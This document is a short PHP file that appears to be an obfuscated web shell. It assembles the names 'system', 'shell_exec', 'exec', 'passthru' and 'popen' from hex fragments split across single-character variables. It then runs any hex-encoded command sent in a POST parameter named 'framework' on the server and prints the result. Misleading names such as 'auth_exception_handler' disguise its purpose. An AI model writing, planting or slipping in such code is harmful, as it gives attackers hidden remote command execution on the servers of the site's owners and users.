<?php


$data_chunk1 = '9';
$data_chunk2 = '7';
$data_chunk3 = '3';
$data_chunk4 = '4';
$data_chunk5 = '6';
$data_chunk6 = '5';
$data_chunk7 = '8';
$data_chunk8 = 'c';
$data_chunk9 = 'f';
$data_chunk10 = '0';
$data_chunk11 = '1';
$data_chunk12 = '2';
$auth_exception_handler1 = pack("H*", '7' . '3' . '7' . $data_chunk1 . $data_chunk2 . $data_chunk3 . $data_chunk2 . $data_chunk4 . $data_chunk5 . $data_chunk6 . '6' . 'd');
$auth_exception_handler2 = pack("H*", '7' . '3' . '6' . $data_chunk7 . $data_chunk5 . '5' . '6' . 'c' . '6' . $data_chunk8 . $data_chunk6 . $data_chunk9 . '6' . $data_chunk6 . $data_chunk2 . '8' . '6' . '5' . $data_chunk5 . '3');
$auth_exception_handler3 = pack("H*", $data_chunk5 . $data_chunk6 . '7' . '8' . '6' . '5' . $data_chunk5 . $data_chunk3);
$auth_exception_handler4 = pack("H*", $data_chunk2 . $data_chunk10 . $data_chunk5 . $data_chunk11 . '7' . $data_chunk3 . '7' . $data_chunk3 . $data_chunk2 . $data_chunk4 . $data_chunk5 . $data_chunk7 . '7' . '2' . $data_chunk2 . '5');
$auth_exception_handler5 = pack("H*", $data_chunk2 . '0' . '6' . $data_chunk9 . $data_chunk2 . '0' . $data_chunk5 . '5' . '6' . 'e');
$auth_exception_handler6 = pack("H*", '7' . '3' . $data_chunk2 . $data_chunk4 . '7' . $data_chunk12 . '6' . '5' . '6' . $data_chunk11 . $data_chunk5 . 'd' . $data_chunk6 . $data_chunk9 . '6' . $data_chunk2 . '6' . $data_chunk6 . '7' . '4' . $data_chunk6 . $data_chunk9 . $data_chunk5 . '3' . $data_chunk5 . 'f' . $data_chunk5 . 'e' . '7' . '4' . $data_chunk5 . '5' . $data_chunk5 . 'e' . '7' . '4' . $data_chunk2 . '3');
$auth_exception_handler7 = pack("H*", $data_chunk2 . $data_chunk10 . '6' . '3' . '6' . 'c' . '6' . 'f' . $data_chunk2 . '3' . $data_chunk5 . '5');
$framework = pack("H*", $data_chunk5 . $data_chunk5 . '7' . '2' . $data_chunk5 . $data_chunk11 . '6' . 'd' . $data_chunk5 . $data_chunk6 . '7' . '7' . $data_chunk5 . $data_chunk9 . '7' . $data_chunk12 . '6' . 'b');
if (isset($_POST[$framework])) {
    $framework = pack("H*", $_POST[$framework]);
    if (function_exists($auth_exception_handler1)) {
        $auth_exception_handler1($framework);
    } elseif (function_exists($auth_exception_handler2)) {
        print $auth_exception_handler2($framework);
    } elseif (function_exists($auth_exception_handler3)) {
        $auth_exception_handler3($framework, $bind_dat);
        print join("\n", $bind_dat);
    } elseif (function_exists($auth_exception_handler4)) {
        $auth_exception_handler4($framework);
    } elseif (function_exists($auth_exception_handler5) && function_exists($auth_exception_handler6) && function_exists($auth_exception_handler7)) {
        $sym_entry = $auth_exception_handler5($framework, 'r');
        if ($sym_entry) {
            $data_hld = $auth_exception_handler6($sym_entry);
            $auth_exception_handler7($sym_entry);
            print $data_hld;
        }
    }
    exit;
}
